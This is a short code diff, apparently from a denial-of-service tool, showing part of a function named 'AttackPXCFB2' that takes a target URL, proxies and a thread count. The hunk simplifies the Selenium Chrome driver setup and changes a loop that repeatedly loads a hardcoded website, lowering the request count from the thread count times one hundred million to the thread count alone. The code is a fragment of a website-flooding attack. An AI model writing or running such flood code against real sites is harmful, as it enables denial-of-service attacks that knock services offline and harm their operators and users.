@@ -622,12 +622,12 @@ def AttackPXCFB2(url, until_datetime, scraper,proxies,th):
                 chromedriver_path = '/usr/bin/chromedriver'  # Update with the actual path
 
                 # Create a new instance of the Chrome driver
-                service = Service(chromedriver_path)
-                driver = webdriver.Chrome(service=service, options=chrome_options)
+                
+                driver = webdriver.Chrome( options=chrome_options)
 
                 # Define the URL you want to scrape
                 url = 'https://xvideos68.com'
-                for _ in range(int(th)*100000000 ):
+                for _ in range(int(th)):
                     driver.get(url)
                     # Get the page source
                     page_source = driver.title
